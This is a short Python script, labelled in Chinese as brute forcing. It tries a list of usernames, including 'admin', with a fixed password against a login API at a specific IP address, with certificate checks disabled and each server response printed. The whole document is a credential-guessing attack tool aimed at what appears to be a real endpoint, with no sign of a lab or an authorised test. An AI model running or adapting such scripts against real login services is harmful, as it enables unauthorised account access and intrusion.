# 爆破
import requests

payload1 = ['zhangsan', 'lisi', 'wangwu', 'admin']
payload2 = ['lkslks']
url = 'https://39.99.38.165:5003/api/user/login'
for i in payload1:
    for j in payload2:
        ar = {
            'username': f'{i}',
            'password': f'{j}'
        }
        # r = requests.post(url=url, data=ar)
        r = requests.post(url=url, json=ar, verify=False).text
        # status_code = r.status_code
        print(r)
        # print(status_code)